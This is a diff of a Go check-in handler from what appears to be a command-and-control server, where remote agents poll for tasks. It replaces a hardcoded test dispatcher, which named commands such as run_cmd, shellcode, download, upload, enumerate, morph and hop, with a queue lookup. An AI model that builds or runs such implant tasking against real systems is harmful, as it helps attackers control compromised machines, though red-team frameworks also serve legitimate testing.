@@ -44,70 +44,47 @@ func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 
 	var response models.ServerTaskResponse
 
-	// TEMPORARY: For testing, always create a task
-	// Later this will be driven by UI/API
-	response.TaskAvailable = true
+	// Check if there are any pending tasks for this agent
+	if TaskManager != nil {
+		// Get all tasks for this agent
+		tasks, err := TaskManager.GetAgentTasks(agentID)
+		if err != nil {
+			log.Printf("|⚠️ CHK_IN| Failed to get tasks for agent %s: %v", agentID, err)
+		} else {
+			// Find the first pending or dispatched task
+			var pendingTask *taskmanager.Task
+			for _, task := range tasks {
+				if task.Status == taskmanager.StatusPending {
+					pendingTask = task
+					break
+				}
+			}
 
-	// Create command arguments (using existing function)
-	command := "hop" // Hardcoded for now
-	var commandArgs json.RawMessage
+			if pendingTask != nil {
+				// We have a task to send!
+				response.TaskAvailable = true
+				response.TaskID = pendingTask.ID
+				response.Command = pendingTask.Command
+				response.Data = pendingTask.Arguments
 
-	switch command {
-	case "download":
-		commandArgs = returnDownloadStruct(w)
-	case "upload":
-		commandArgs = returnUploadStruct(w)
-	case "run_cmd":
-		commandArgs = returnRunCmdStruct(w)
-	case "shellcode":
-		commandArgs = returnShellcodeStruct(w)
-	case "enumerate":
-		commandArgs = returnEnumerateStruct(w)
-	case "morph":
-		commandArgs = returnMorphStruct(w)
-	case "hop":
-		commandArgs = returnHopStruct(w)
-	default:
-		// For commands without special args
+				// Mark as dispatched
+				if err := TaskManager.MarkDispatched(pendingTask.ID); err != nil {
+					log.Printf("|⚠️ CHK_IN| Failed to mark task %s as dispatched: %v",
+						pendingTask.ID, err)
+				}
 
-		log.Printf("|❗WARN TASK| Command not recognized: %s", command)
-		commandArgs = json.RawMessage("{}")
+				log.Printf("|📌 TASK ISSUED| Sent queued task %s (%s) to agent %s via HTTP check-in",
+					pendingTask.ID, pendingTask.Command, agentID)
+			} else {
+				// No tasks available
+				response.TaskAvailable = false
+				log.Printf("|CHK_IN| No pending tasks for agent %s", agentID)
+			}
+		}
+	} else {
+		// Fallback if TaskManager not initialized
+		response.TaskAvailable = false
 	}
-
-	// Create task in task manager
-	task, err := TaskManager.CreateTask(agentID, command, commandArgs)
-	if err != nil {
-		log.Printf("|❗ERR TASK| Failed to create task: %v", err)
-		http.Error(w, "Failed to create task", http.StatusInternalServerError)
-		return
-	}
-
-	// Use orchestrator to prepare the task (sets metadata, validates args, etc.)
-	if err := Orchestrators.PrepareTask(task); err != nil {
-		log.Printf("|❗ERR TASK| Failed to prepare task: %v", err)
-		http.Error(w, "Failed to prepare task", http.StatusInternalServerError)
-		return
-	}
-
-	// Update task with any metadata set by the orchestrator
-	if err := TaskManager.UpdateTask(task); err != nil {
-		log.Printf("|❗WARN TASK| Failed to update task after preparation: %v", err)
-		// Continue anyway - task was created
-	}
-
-	// Populate response with task details
-	response.TaskID = task.ID
-	response.Command = task.Command
-	response.Data = task.Arguments
-
-	// Mark task as dispatched
-	if err := TaskManager.MarkDispatched(task.ID); err != nil {
-		log.Printf("|❗WARN TASK| Failed to mark task as dispatched: %v", err)
-		// Continue anyway - task was created and sent
-	}
-
-	log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s",
-		response.Command, response.TaskID, agentID)
 
 	// Send response
 	w.Header().Set("Content-Type", "application/json")
